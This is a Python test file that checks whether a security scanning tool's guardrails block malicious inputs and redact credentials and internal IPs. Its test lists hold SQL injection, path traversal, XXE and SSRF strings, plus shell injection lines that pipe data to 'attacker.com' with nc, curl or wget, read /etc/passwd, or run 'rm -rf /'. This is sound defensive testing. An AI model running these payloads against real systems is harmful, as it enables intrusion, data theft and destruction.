"""
Security Tests - Attack Prevention

Tests that the system prevents common security attacks and malicious inputs.
Validates guardrails are effective against real attack patterns.

Context: Red team testing against our own defenses.
"""

import pytest
from alprina_cli.tools.security.scan import ScanTool, ScanParams
from alprina_cli.tools.security.recon import ReconTool, ReconParams
from alprina_cli.tools.security.vuln_scan import VulnScanTool, VulnScanParams
from alprina_cli.tools.base import ToolError, ToolOk


class TestSQLInjectionPrevention:
    """Test prevention of SQL injection attacks"""

    @pytest.mark.asyncio
    async def test_classic_sql_injection(self):
        """Test: Block classic SQL injection (OR 1=1)"""
        tool = ScanTool()

        malicious_inputs = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' OR '1'='1' /*",
            "1' OR '1' = '1",
        ]

        for malicious in malicious_inputs:
            params = ScanParams(target=malicious, scan_type="quick", ports="80")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"
            assert "Security violation" in result.message
            assert "SQL injection" in result.message

    @pytest.mark.asyncio
    async def test_union_based_sql_injection(self):
        """Test: Block UNION-based SQL injection"""
        tool = ScanTool()

        malicious_inputs = [
            "' UNION SELECT NULL--",
            "' UNION SELECT * FROM users--",
            "1 UNION SELECT password FROM admin",
        ]

        for malicious in malicious_inputs:
            params = ScanParams(target=malicious, scan_type="quick", ports="80")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"
            assert "SQL injection" in result.message

    @pytest.mark.asyncio
    async def test_time_based_blind_sql_injection(self):
        """Test: Block time-based blind SQL injection"""
        tool = ScanTool()

        malicious_inputs = [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
        ]

        for malicious in malicious_inputs:
            params = ScanParams(target=malicious, scan_type="quick", ports="80")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"


class TestCommandInjectionPrevention:
    """Test prevention of command injection attacks"""

    @pytest.mark.asyncio
    async def test_shell_command_injection(self):
        """Test: Block shell command injection"""
        tool = ReconTool()

        malicious_inputs = [
            "example.com; rm -rf /",
            "example.com && cat /etc/passwd",
            "example.com | nc attacker.com 4444",
            "example.com`whoami`",
            "example.com$(whoami)",
        ]

        for malicious in malicious_inputs:
            params = ReconParams(target=malicious, operation="whois", timeout=30)
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"
            assert "Security violation" in result.message

    @pytest.mark.asyncio
    async def test_command_chaining_injection(self):
        """Test: Block command chaining attempts"""
        tool = ScanTool()

        malicious_inputs = [
            "127.0.0.1 && ping -c 1 attacker.com",
            "127.0.0.1 || curl attacker.com",
            "127.0.0.1; wget http://attacker.com/shell",
        ]

        for malicious in malicious_inputs:
            params = ScanParams(target=malicious, scan_type="quick", ports="80")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"

    @pytest.mark.asyncio
    async def test_pipe_and_redirect_injection(self):
        """Test: Block pipe and redirect injection"""
        tool = ReconTool()

        malicious_inputs = [
            "example.com | bash",
            "example.com > /tmp/pwned",
            "example.com < /etc/passwd",
            "example.com >> /var/log/access.log",
        ]

        for malicious in malicious_inputs:
            params = ReconParams(target=malicious, operation="dns", timeout=30)
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"


class TestPathTraversalPrevention:
    """Test prevention of path traversal attacks"""

    @pytest.mark.asyncio
    async def test_basic_path_traversal(self):
        """Test: Block basic path traversal"""
        tool = VulnScanTool()

        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ]

        for malicious in malicious_inputs:
            params = VulnScanParams(target=malicious, depth="quick")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"
            assert "path traversal" in result.message.lower() or "Security violation" in result.message

    @pytest.mark.asyncio
    async def test_encoded_path_traversal(self):
        """Test: Block URL-encoded path traversal"""
        tool = ScanTool()

        malicious_inputs = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ]

        for malicious in malicious_inputs:
            params = ScanParams(target=malicious, scan_type="quick", ports="80")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"

    @pytest.mark.asyncio
    async def test_absolute_path_access(self):
        """Test: Block unauthorized absolute path access"""
        tool = VulnScanTool()

        malicious_inputs = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        for malicious in malicious_inputs:
            params = VulnScanParams(target=malicious, depth="quick")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"


class TestXXEPrevention:
    """Test prevention of XML External Entity (XXE) attacks"""

    @pytest.mark.asyncio
    async def test_xxe_file_disclosure(self):
        """Test: Block XXE file disclosure"""
        tool = VulnScanTool()

        malicious_inputs = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">',
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/shadow">]>',
        ]

        for malicious in malicious_inputs:
            params = VulnScanParams(target=malicious, depth="quick")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"
            assert "XML" in result.message or "XXE" in result.message or "ENTITY" in result.message or "Security violation" in result.message

    @pytest.mark.asyncio
    async def test_xxe_ssrf(self):
        """Test: Block XXE SSRF attacks"""
        tool = ScanTool()

        malicious_inputs = [
            '<!ENTITY xxe SYSTEM "http://internal.host/secret">',
            '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">',
        ]

        for malicious in malicious_inputs:
            params = ScanParams(target=malicious, scan_type="quick", ports="80")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"


class TestLengthBasedDoSPrevention:
    """Test prevention of length-based DoS attacks"""

    @pytest.mark.asyncio
    async def test_extremely_long_input(self):
        """Test: Block extremely long inputs (DoS prevention)"""
        tool = ScanTool()

        # Generate very long input (> 10000 chars)
        malicious_input = "A" * 15000

        params = ScanParams(target=malicious_input, scan_type="quick", ports="80")
        result = await tool(params)

        assert isinstance(result, ToolError), "Failed to block excessively long input"
        assert "too long" in result.message.lower() or "length" in result.message.lower()

    @pytest.mark.asyncio
    async def test_reasonable_length_input(self):
        """Test: Allow reasonable length inputs"""
        tool = ScanTool()

        # Normal length input
        reasonable_input = "example.com"

        params = ScanParams(target=reasonable_input, scan_type="quick", ports="80")
        result = await tool(params)

        # Should succeed (though target may not exist, that's a different issue)
        assert isinstance(result, (ToolOk, ToolError))
        if isinstance(result, ToolError):
            # Should NOT be blocked by length guardrail
            assert "length" not in result.message.lower()


class TestDataExfiltrationPrevention:
    """Test that sensitive data is not leaked in outputs"""

    @pytest.mark.asyncio
    async def test_pii_scrubbing_in_errors(self):
        """Test: PII is scrubbed even from error messages"""
        from alprina_cli.tools.base import AlprinaToolBase
        from pydantic import BaseModel

        class TestParams(BaseModel):
            data: str

        class PIIErrorTool(AlprinaToolBase[TestParams]):
            name = "PIIErrorTool"
            description = "Test tool that returns PII in error"
            params = TestParams

            async def execute(self, params: TestParams):
                return ToolError(
                    message="Error: contact admin@example.com or call 555-123-4567",
                    brief="Error occurred"
                )

        tool = PIIErrorTool()
        result = await tool(TestParams(data="test"))

        # Note: Current implementation only sanitizes ToolOk, not ToolError
        # This test documents the current behavior
        # TODO: Consider sanitizing ToolError messages as well
        assert isinstance(result, ToolError)

    @pytest.mark.asyncio
    async def test_credential_filtering_in_output(self):
        """Test: Credentials are filtered from successful outputs"""
        from alprina_cli.tools.base import AlprinaToolBase
        from pydantic import BaseModel

        class TestParams(BaseModel):
            target: str

        class CredentialTool(AlprinaToolBase[TestParams]):
            name = "CredentialTool"
            description = "Test tool"
            params = TestParams

            async def execute(self, params: TestParams):
                return ToolOk(content={
                    "target": params.target,
                    "api_key": "api_key=sk_live_1234567890abcdefghijklmnop",
                    "aws_key": "AKIAIOSFODNN7EXAMPLE"
                })

        tool = CredentialTool()
        result = await tool(TestParams(target="test.com"))

        assert isinstance(result, ToolOk)
        content_str = str(result.content)
        assert "[API_KEY_REDACTED]" in content_str
        assert "[AWS_ACCESS_KEY_REDACTED]" in content_str
        assert "sk_live_" not in content_str
        assert "AKIAIOSFODNN7EXAMPLE" not in content_str

    @pytest.mark.asyncio
    async def test_ip_address_redaction(self):
        """Test: Internal IP addresses are redacted"""
        from alprina_cli.tools.base import AlprinaToolBase
        from pydantic import BaseModel

        class TestParams(BaseModel):
            target: str

        class IPTool(AlprinaToolBase[TestParams]):
            name = "IPTool"
            description = "Test tool"
            params = TestParams

            async def execute(self, params: TestParams):
                return ToolOk(content={
                    "internal_servers": [
                        "Server 1: 10.0.0.5",
                        "Server 2: 192.168.1.10",
                        "Server 3: 172.16.0.20"
                    ]
                })

        tool = IPTool()
        result = await tool(TestParams(target="test.com"))

        assert isinstance(result, ToolOk)
        content_str = str(result.content)
        assert "[IP_REDACTED]" in content_str
        # Ensure actual IPs are not present
        assert "10.0.0.5" not in content_str
        assert "192.168.1.10" not in content_str
        assert "172.16.0.20" not in content_str


class TestCombinedAttackVectors:
    """Test prevention of combined/chained attacks"""

    @pytest.mark.asyncio
    async def test_sql_injection_with_command_injection(self):
        """Test: Block combined SQL + command injection"""
        tool = ScanTool()

        malicious_input = "'; DROP TABLE users; exec('rm -rf /');--"

        params = ScanParams(target=malicious_input, scan_type="quick", ports="80")
        result = await tool(params)

        assert isinstance(result, ToolError)
        assert "Security violation" in result.message

    @pytest.mark.asyncio
    async def test_path_traversal_with_command_injection(self):
        """Test: Block combined path traversal + command injection"""
        tool = VulnScanTool()

        malicious_input = "../../../etc/passwd; cat /etc/shadow"

        params = VulnScanParams(target=malicious_input, depth="quick")
        result = await tool(params)

        assert isinstance(result, ToolError)

    @pytest.mark.asyncio
    async def test_multiple_encoding_bypass_attempt(self):
        """Test: Block multiple encoding bypass attempts"""
        tool = ScanTool()

        # Try to bypass with double encoding
        malicious_inputs = [
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%27%20OR%20%271%27%3D%271",
        ]

        for malicious in malicious_inputs:
            params = ScanParams(target=malicious, scan_type="quick", ports="80")
            result = await tool(params)

            assert isinstance(result, ToolError), f"Failed to block: {malicious}"


class TestEdgeCases:
    """Test edge cases and boundary conditions"""

    @pytest.mark.asyncio
    async def test_empty_input(self):
        """Test: Handle empty input gracefully"""
        from pydantic_core import ValidationError

        tool = ScanTool()

        # Empty input should be rejected by Pydantic validation
        with pytest.raises(ValidationError):
            params = ScanParams(target="", scan_type="quick", ports="80")

    @pytest.mark.asyncio
    async def test_unicode_characters(self):
        """Test: Handle unicode characters safely"""
        tool = ReconTool()

        unicode_input = "例え.com"  # Japanese characters

        params = ReconParams(target=unicode_input, operation="whois", timeout=30)
        result = await tool(params)

        # Should handle gracefully
        assert isinstance(result, (ToolOk, ToolError))

    @pytest.mark.asyncio
    async def test_special_characters(self):
        """Test: Handle special characters safely"""
        tool = ScanTool()

        special_chars = "test!@#$%^&*()_+-=[]{}|;':\"<>?,./"

        params = ScanParams(target=special_chars, scan_type="quick", ports="80")
        result = await tool(params)

        # Should handle gracefully (but may block malicious patterns)
        assert isinstance(result, (ToolOk, ToolError))


class TestFalsePositiveReduction:
    """Test that legitimate inputs are not blocked (reduce false positives)"""

    @pytest.mark.asyncio
    async def test_legitimate_domain_names(self):
        """Test: Allow legitimate domain names"""
        tool = ScanTool()

        legitimate_domains = [
            "example.com",
            "sub.example.com",
            "example-site.com",
            "example123.org",
        ]

        for domain in legitimate_domains:
            params = ScanParams(target=domain, scan_type="quick", ports="80")
            result = await tool(params)

            # Should not be blocked by guardrails
            assert isinstance(result, (ToolOk, ToolError))
            if isinstance(result, ToolError):
                assert "Security violation" not in result.message

    @pytest.mark.asyncio
    async def test_legitimate_ip_addresses(self):
        """Test: Allow legitimate public IP addresses"""
        tool = ScanTool()

        public_ips = [
            "8.8.8.8",  # Google DNS
            "1.1.1.1",  # Cloudflare DNS
            "208.67.222.222",  # OpenDNS
        ]

        for ip in public_ips:
            params = ScanParams(target=ip, scan_type="quick", ports="80")
            result = await tool(params)

            # Should not be blocked by guardrails
            assert isinstance(result, (ToolOk, ToolError))
            if isinstance(result, ToolError):
                assert "Security violation" not in result.message

    @pytest.mark.asyncio
    async def test_legitimate_port_numbers(self):
        """Test: Allow legitimate port specifications"""
        tool = ScanTool()

        legitimate_ports = [
            "80",
            "443",
            "22",
            "80,443,8080",
            "1-1000",
        ]

        for ports in legitimate_ports:
            params = ScanParams(target="example.com", scan_type="quick", ports=ports)
            result = await tool(params)

            # Should not be blocked by guardrails
            assert isinstance(result, (ToolOk, ToolError))
            if isinstance(result, ToolError):
                assert "Security violation" not in result.message
